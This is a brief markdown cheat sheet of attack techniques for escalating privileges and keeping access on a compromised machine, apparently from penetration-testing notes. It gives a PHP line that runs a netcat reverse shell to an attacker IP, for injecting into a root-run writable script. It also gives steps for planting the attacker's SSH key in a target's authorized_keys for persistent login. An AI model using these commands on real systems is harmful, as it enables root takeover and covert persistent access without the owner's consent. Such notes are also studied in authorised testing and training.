### Misconfigured Script Permissions
``` bash
#need write perm to file/script that is running on root. ex. index.php
#we can add to the file reverse shell and gain root when file is executed
#(example on php file that we have write perm)
<?php system(‘nc 192.168.0.18 4445 -e /bin/bash’)?>
```

### Create SSH Keys
``` bash
ssh-keygen -t rsa -b 4096 #give any password
#This created both id_rsa and id_rsa.pub in ~/.ssh directory
#Copy the content in "id_rsa.pub" and create ".ssh" directory in /home of target machine.
chmod 700 ~/.ssh
nano ~/.ssh/authorized_keys #enter the copied content here
chmod 600 ~/.ssh/authorized_keys 
#On Attacker machine
ssh username@target_ip #enter password if you gave any`
```
